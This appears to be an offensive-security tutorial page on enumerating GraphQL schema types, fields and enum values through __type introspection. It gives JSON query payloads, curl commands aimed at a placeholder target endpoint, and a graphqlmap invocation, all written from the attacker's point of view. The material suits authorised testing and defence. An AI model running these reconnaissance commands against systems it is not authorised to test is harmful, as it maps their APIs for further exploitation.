---
title: Master GraphQL Type Enumeration Techniques
description: Learn to enumerate GraphQL type definitions using introspection queries
  for fields and enums.
keywords:
- GraphQL
- type enumeration
- introspection
- __type query
- schema mapping
- enum extraction
- API vulnerability
- field enumeration
- GraphQL injection
---

# Enumerate Types Definition

## Context

This guide aims to equip you with the skills needed to enumerate and extract detailed GraphQL type definitions. By leveraging introspection queries or injection attacks, you will learn how to uncover the fields, scalar types, and enum values defined in a GraphQL schema. Prior understanding of GraphQL schema structure, query and mutation syntax, and basic GraphQL injection techniques is assumed.

## Theory

### GraphQL Type System and Introspection

GraphQL types define the structure of the data available through the API. These include objects, scalars, enums, and interfaces. The powerful feature of GraphQL introspection allows clients to query the server for its schema metadata, which includes all type definitions and their fields. When introspection is enabled, it can become a vulnerability, as attackers can enumerate types, leading to disclosure of sensitive schema details.

### The __type Introspection Query

The `__type` is a specific introspection field in GraphQL used to return metadata about a particular type. Attackers can craft queries targeting `__type` to enumerate all fields, scalar types, and enum values for any named type. A query using `__type` returns a JSON object that describes the type's fields, input types, and possible enum values, revealing the underlying schema structure to the attacker.

### Type Enumeration Attack Surface

Many APIs assume that only trustworthy clients will use introspection features. This assumption can expose schema details to attackers when introspection is not appropriately restricted. The lack of such restrictions presents a weakness, allowing attackers to map the entire GraphQL schema, which can be helpful for further exploitation activities.

## Practice

### Enumerate Object Type Fields via __type

To enumerate all fields of an object type such as "User," a crafted query using the `__type` introspection field is needed. 

- **Payload**

    ```json
    {
        "query": "{ __type(name: \"User\") { name fields { name type { name kind } } } }"
    }
    ```

    This query is designed to retrieve all fields and their types for the "User" object.

- **Command**

    ```bash
    curl -X POST -H "Content-Type: application/json" --data '{ "query": "{ __type(name: \"User\") { name fields { name type { name kind } } } }" }' http://target/graphql
    ```

    Execute the above command to send the introspection query to the GraphQL endpoint.

**Outcome**: The attacker obtains a comprehensive list of all fields and their types for the given object type, revealing structural information about the API's user model.

### Enumerate Scalar Types and Enum Values

To extract possible values of an enumeration type, such as "Status," a similar introspection query can be used.

- **Payload**

    ```json
    {
        "query": "{ __type(name: \"Status\") { name kind enumValues { name description } } }"
    }
    ```

    This query targets the "Status" enum to extract all potential values and their accompanying descriptions.

- **Command**

    ```bash
    curl -X POST -H "Content-Type: application/json" --data '{ "query": "{ __type(name: \"Status\") { name kind enumValues { name description } } }" }' http://target/graphql
    ```

    Send this crafted query to the GraphQL endpoint to retrieve the enum values.

**Outcome**: The attacker gains access to all possible values and descriptions for the specified enum type, providing insight into the permissible state values used within the API.

### Automated Type Enumeration with GraphQL Tools

Automating the type enumeration process can significantly expedite the task and reduce human error. Utilizing tools like `graphqlmap`, entire schemas can be introspected and enumerated effectively.

- **Command**

    ```bash
    python3 graphqlmap.py -u http://target/graphql --introspect
    ```

Run this command to use `graphqlmap` for automated extraction of type definitions, fields, and enums.

**Outcome**: Automation aids in quickly uncovering complete schema details, facilitating further exploitation with minimal manual intervention.

## Tools

- **curl**
- **graphqlmap**